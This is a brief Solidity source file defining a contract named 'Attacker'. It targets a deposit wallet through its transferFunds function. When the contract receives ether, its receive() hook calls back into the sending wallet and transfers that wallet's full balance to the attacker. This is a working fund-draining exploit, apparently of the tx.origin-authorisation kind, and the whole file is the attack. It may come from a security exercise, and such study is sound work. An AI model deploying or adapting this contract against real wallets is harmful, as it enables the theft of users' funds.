// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IDepositWallet {
    function transferFunds(address payable _to, uint256 _amount) external;
}

contract Attacker {
    address payable attacker;

    constructor() {
        attacker = payable(msg.sender);
    }

    receive() external payable {
        IDepositWallet(msg.sender).transferFunds(attacker, msg.sender.balance);
    }
}